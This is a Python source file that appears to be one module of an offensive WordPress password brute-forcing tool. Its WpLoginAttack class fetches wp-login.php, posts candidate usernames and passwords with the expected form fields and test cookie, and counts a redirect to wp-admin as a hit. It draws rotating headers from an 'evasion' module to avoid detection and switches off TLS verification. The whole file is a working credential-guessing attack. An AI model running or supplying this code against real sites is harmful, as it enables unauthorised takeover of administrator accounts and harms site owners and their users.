"""wp-login.php POST attack module — used when XML-RPC is disabled"""
import re
import requests
from evasion.useragent import get_headers


class WpLoginAttack:
    def __init__(self, login_url, timeout=15):
        self.login_url = login_url
        self.timeout = timeout
        self.session = requests.Session()
        self.session.verify = False

    def try_login(self, username, password):
        """Try single password — returns True/False"""
        try:
            # 1. Fetch login page — get cookie and nonce
            resp = self.session.get(
                self.login_url,
                headers=get_headers(),
                timeout=self.timeout
            )
            if resp.status_code != 200:
                return None  # page not accessible

            # 2. POST ile login dene
            data = {
                "log": username,
                "pwd": password,
                "wp-submit": "Log In",
                "redirect_to": self.login_url.rsplit('/', 2)[0] + "/wp-admin/",
                "testcookie": "1",
            }
            self.session.cookies.set("wordpress_test_cookie", "WP Cookie check")

            resp2 = self.session.post(
                self.login_url,
                data=data,
                headers=get_headers({"Content-Type": "application/x-www-form-urlencoded"}),
                timeout=self.timeout,
                allow_redirects=False
            )

            # 3. Success check
            if resp2.status_code == 302:
                location = resp2.headers.get("Location", "")
                if "wp-admin" in location and "login" not in location.lower():
                    return True

            return False

        except Exception:
            return None
